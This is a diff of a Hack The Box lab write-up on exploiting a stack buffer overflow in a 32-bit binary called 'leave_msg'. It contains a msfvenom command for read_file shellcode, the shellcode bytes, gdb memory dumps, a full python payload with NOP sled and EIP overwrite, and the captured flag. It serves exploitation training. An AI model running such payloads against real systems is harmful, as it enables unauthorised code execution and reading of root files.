@@ -136,61 +136,6 @@ Now that it works, update "shellcodePwn.py" to read "/root/flag.txt":
     48b801010101010101015048b860662f75797501014831042448b82f726f6f742f666c506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
 
 
-Now that we've got a shellcode, lets craft a payload. Our requirements are:
-
-- 2060 bytes + pointer to shellcode.
-- 64 bytes (128 chars) for shellcode.
-- Lets add 100 bytes of no operation instruction (NOPS)
-
-         Buffer = "\x41" * (2060 - 100 - 128) = 1896
-           NOPs = "\x90" * 100
-      Shellcode = "48b8...0f05"
-            EIP = "\x5a" * 4
-
-
-After using the payload, lets find where the shellcode is in memory:
-
-    (gdb) x/30xg $esp+2332
-    0xffffd68c:	0x4141414141414141	0x4141414141414141
-    0xffffd69c:	0x4141414141414141	0x4141414141414141
-    0xffffd6ac:	0x4141414141414141	0x9090414141414141
-    0xffffd6bc:	0x9090909090909090	0x9090909090909090
-    0xffffd6cc:	0x9090909090909090	0x9090909090909090
-    0xffffd6dc:	0x9090909090909090	0x9090909090909090
-    0xffffd6ec:	0x9090909090909090	0x9090909090909090
-    0xffffd6fc:	0x9090909090909090	0x9090909090909090
-    0xffffd70c:	0x9090909090909090	0x9090909090909090
-    0xffffd71c:	0x3130386238349090	0x3130313031303130
-    0xffffd72c:	0x3035313031303130	0x3636303638623834
-    0xffffd73c:	0x3537393735376632	0x3133383431303130
-    0xffffd74c:	0x3862383434323430	0x6636663632376632
-    0xffffd75c:	0x6336363666323437	0x3835323061363035
-    0xffffd76c:	0x3133376539383834	0x3134353066303666
-
-0xffffd71c
-
-
-run $(python -c 'print "\x41"*1896 + "\x90"*100 + "H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8`f/uyu\x01\x01H1\x04$H\xb8/root/flPj\x02XH\x89\xe71\xf6\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05" + "\x66"*4')
-
-    (gdb) x/30xg $esp+2332
-    0xffffd68c:	0x4141414141414141	0x4141414141414141
-    0xffffd69c:	0x4141414141414141	0x4141414141414141
-    0xffffd6ac:	0x4141414141414141	0x4141414141414141
-    0xffffd6bc:	0x4141414141414141	0x4141414141414141
-    0xffffd6cc:	0x4141414141414141	0x4141414141414141
-    0xffffd6dc:	0x4141414141414141	0x4141414141414141
-    0xffffd6ec:	0x4141414141414141	0x9090414141414141
-    0xffffd6fc:	0x9090909090909090	0x9090909090909090
-    0xffffd70c:	0x9090909090909090	0x9090909090909090
-    0xffffd71c:	0x9090909090909090	0x9090909090909090
-    0xffffd72c:	0x9090909090909090	0x9090909090909090
-    0xffffd73c:	0x9090909090909090	0x9090909090909090
-    0xffffd74c:	0x9090909090909090	0x9090909090909090
-    0xffffd75c:	0x01010101b8489090	0x60b8485001010101
-    0xffffd76c:	0x4801017579752f66	0x6f722fb848240431
-
-Now all we need to do is point EIP to: 0xffffd75c
-
 
 # Payload:
 
@@ -201,10 +146,89 @@ We'll use msfvenom to find a sutable exploit. Our target uses 32-bit registers s
         ...
         linux/x86/read_file   Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
 
+Next, we'll generate shellcode to read /root/flag.txt:
+
+    msfvenom -p linux/x86/read_file PATH=/root/flag.txt FD=1 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
+    Found 11 compatible encoders
+    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+    x86/shikata_ga_nai succeeded with size 103 (iteration=0)
+    x86/shikata_ga_nai chosen with final size 103
+    Payload size: 103 bytes
+    Final size of c file: 460 bytes
+    Saved as: shellcode
 
 
+    cat shellcode
+    unsigned char buf[] = 
+    "\xda\xca\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x14\xbb\x2e\x1c"
+    "\x18\xb8\x31\x5f\x17\x03\x5f\x17\x83\xe9\x18\xfa\x4d\x1e"
+    "\x16\x42\xa8\xe0\x57\xb2\xe8\xd1\x9e\x7f\x8e\x98\xe2\x38"
+    "\x8c\x9a\xe4\x38\x1a\x7d\x6d\xc1\xa6\x81\x7e\x32\xd7\x4c"
+    "\xfe\xbb\x15\xf6\xfb\xbb\x99\x06\xbf\xbd\x99\x06\xbf\x70"
+    "\x19\xbe\xbe\x8a\x1a\xbe\x7b\x8a\x1a\xbe\x7b\x46\x9a\x56"
+    "\xbe\xa7\x64\x59\x6e\x2a\xf4\xca\x05\xe5\x6c\x78\x87\x9e"
+    "\x5e\xf4\x3f\x15\x9f";
 
 
+Now that we've got a shellcode, lets craft a payload. Our requirements are:
+
+- 2060 bytes + pointer to shellcode.
+- 64 bytes (128 chars) for shellcode.
+- Lets add 100 bytes of no operation instruction (NOPS)
+
+         Buffer = "\x41" * (2060 - 100 - 103) = 1857
+           NOPs = "\x90" * 100
+      Shellcode = b'\xbf...\xa0'
+            EIP = "\x5a" * 4
 
 
+Letscraft our payload and write it to a file:
 
+    run $(python -c "print(b'\x41'*(2060-100-103) + b'\x90'*100 + b'\xbf\xd5\x4d\x07\xb9\xdb\xc2\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x14\x31\x7e\x12\x83\xc6\x04\x03\xab\x43\xe5\x4c\xb8\x6a\x51\xab\x3e\x93\xa1\xef\x0f\x5a\x6c\x8f\xe6\x9f\xd7\x93\xf8\x1f\x28\x1d\x1f\x96\xd1\xa7\xdf\xb9\x21\xd8\x12\x39\xa8\x1a\x14\x3e\xab\x9a\x64\x84\xaa\x9a\x64\xfa\x61\x1a\xdc\xfb\x79\x1b\x1c\x47\x79\x1b\x1c\xb7\xb7\x9b\xf4\x72\xb8\x63\xfb\x52\x35\xf3\x6c\xd9\x96\x6d\x1e\x40\x8e\x5f\xaa\xfa\x24\xa0' + b'\x5a'*4)")
+
+When we test this out we get:
+
+    (gdb) run $(python -c "print(b'\x41'*(2060-100-103) + b'\x90'*100 + b'\xbf\xd5\x4d\x07\xb9\xdb\xc2\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x14\x31\x7e\x12\x83\xc6\x04\x03\xab\x43\xe5\x4c\xb8\x6a\x51\xab\x3e\x93\xa1\xef\x0f\x5a\x6c\x8f\xe6\x9f\xd7\x93\xf8\x1f\x28\x1d\x1f\x96\xd1\xa7\xdf\xb9\x21\xd8\x12\x39\xa8\x1a\x14\x3e\xab\x9a\x64\x84\xaa\x9a\x64\xfa\x61\x1a\xdc\xfb\x79\x1b\x1c\x47\x79\x1b\x1c\xb7\xb7\x9b\xf4\x72\xb8\x63\xfb\x52\x35\xf3\x6c\xd9\x96\x6d\x1e\x40\x8e\x5f\xaa\xfa\x24\xa0' + b'\x5a'*4)")
+    Starting program: /home/htb-student/leave_msg $(python -c "print(b'\x41'*(2060-100-103) + b'\x90'*100 + b'\xbf\xd5\x4d\x07\xb9\xdb\xc2\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x14\x31\x7e\x12\x83\xc6\x04\x03\xab\x43\xe5\x4c\xb8\x6a\x51\xab\x3e\x93\xa1\xef\x0f\x5a\x6c\x8f\xe6\x9f\xd7\x93\xf8\x1f\x28\x1d\x1f\x96\xd1\xa7\xdf\xb9\x21\xd8\x12\x39\xa8\x1a\x14\x3e\xab\x9a\x64\x84\xaa\x9a\x64\xfa\x61\x1a\xdc\xfb\x79\x1b\x1c\x47\x79\x1b\x1c\xb7\xb7\x9b\xf4\x72\xb8\x63\xfb\x52\x35\xf3\x6c\xd9\x96\x6d\x1e\x40\x8e\x5f\xaa\xfa\x24\xa0' + b'\x5a'*4)")
+    
+    Program received signal SIGSEGV, Segmentation fault.
+    0x5a5a5a5a in ?? ()
+
+- As we can see we've successfully overwritten EIP with 4 Z's (0x5a).
+
+Now we need to find where the shellcode is stored in memory:
+
+    (gdb) x/32xg $esp+2372
+    0xffffd6b4:	0x4141414141414141	0x4141414141414141
+    0xffffd6c4:	0x4141414141414141	0x9090904141414141
+    0xffffd6d4:	0x9090909090909090	0x9090909090909090
+    0xffffd6e4:	0x9090909090909090	0x9090909090909090
+    0xffffd6f4:	0x9090909090909090	0x9090909090909090
+    0xffffd704:	0x9090909090909090	0x9090909090909090
+    0xffffd714:	0x9090909090909090	0x9090909090909090
+    0xffffd724:	0x9090909090909090	0x9090909090909090
+    0xffffd734:	0xc2dbb9074dd5bf90	0xb1c9315ef42474d9
+    0xffffd744:	0x0304c683127e3114	0xab516ab84ce543ab
+    0xffffd754:	0x8f6c5a0fefa1933e	0x1d281ff893d79fe6
+    0xffffd764:	0xd821b9dfa7d1961f	0x9aab3e141aa83912
+    0xffffd774:	0x1a61fa649aaa8464	0x1b79471c1b79fbdc
+    0xffffd784:	0x63b872f49bb7b71c	0x6d96d96cf33552fb
+    0xffffd794:	0xa024faaa5f8e401e	0x5f534c005a5a5a5a
+    0xffffd7a4:	0x723d53524f4c4f43	0x303d69643a303d73
+
+- It starts at: 0xffffd734
+
+So lets adjust our payload to point EIP to this address:
+
+- Note: Little endian:
+
+        0xffffd734 -> \x34\xd7\xff\xff
+
+So now we have:
+
+    python -c "print(b'\x41'*(2060-100-103) + b'\x90'*100 + b'\xbf\xd5\x4d\x07\xb9\xdb\xc2\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x14\x31\x7e\x12\x83\xc6\x04\x03\xab\x43\xe5\x4c\xb8\x6a\x51\xab\x3e\x93\xa1\xef\x0f\x5a\x6c\x8f\xe6\x9f\xd7\x93\xf8\x1f\x28\x1d\x1f\x96\xd1\xa7\xdf\xb9\x21\xd8\x12\x39\xa8\x1a\x14\x3e\xab\x9a\x64\x84\xaa\x9a\x64\xfa\x61\x1a\xdc\xfb\x79\x1b\x1c\x47\x79\x1b\x1c\xb7\xb7\x9b\xf4\x72\xb8\x63\xfb\x52\x35\xf3\x6c\xd9\x96\x6d\x1e\x40\x8e\x5f\xaa\xfa\x24\xa0' + b'\x5a'*4)" > payload
+
+If we execute this in gdb, the read output is not legible, so instead we can write it to a file and pass that to leave_msg:
+
+./leave_msg $(cat payload)
+HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t}
